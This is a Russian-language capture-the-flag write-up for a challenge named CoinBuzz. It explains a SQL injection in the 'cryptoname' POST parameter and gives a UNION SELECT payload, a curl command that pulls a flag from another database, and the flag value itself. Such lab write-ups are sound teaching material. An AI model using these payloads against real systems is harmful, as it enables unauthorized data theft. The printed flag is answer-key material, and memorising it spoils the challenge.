# Writeup: CoinBuzz (SQLi)

## Идея
Сервис показывает цену криптовалюты. Значение параметра `cryptoname` из POST-запроса подставляется в SQL-запрос строковой конкатенацией:

```sql
SELECT crypto_price FROM cryptocurrency WHERE crypto_name LIKE '<USER_INPUT>';
```

Из-за отсутствия параметризации возможна **SQL-инъекция**.

## Точка входа
1. Откройте главную страницу сервиса.
2. Нажмите «Показать цену» для любой монеты.
3. Перехватите POST-запрос на `/check_crypto` (Burp Suite / DevTools / curl).

Тело запроса выглядит примерно так:

```
cryptoname=Bitcoin
```

## Эксплуатация
Нужно закрыть кавычку, добавить `UNION SELECT`, и закомментировать хвост запроса.

В базе флаг лежит в другой БД `customer_secret_data` в таблице `secret_flag`, поэтому используем кросс-БД запрос.

Payload:

```
Bitcoin' UNION SELECT flag FROM customer_secret_data.secret_flag -- -
```

Итоговый запрос на сервере станет:

```sql
SELECT crypto_price FROM cryptocurrency
WHERE crypto_name LIKE 'Bitcoin' UNION SELECT flag FROM customer_secret_data.secret_flag -- -';
```

## Получение флага (пример)
Пример с `curl`:

```bash
curl -s -X POST http://<HOST>/check_crypto \
  -d "cryptoname=Bitcoin' UNION SELECT flag FROM customer_secret_data.secret_flag -- -" \
  | grep -oE 'CTF\{[^}]+\}'
```

В ответе в списке цен появится строка с флагом.

## Флаг
`CTF{c01nbuzz_sql_inj_1n_like}`
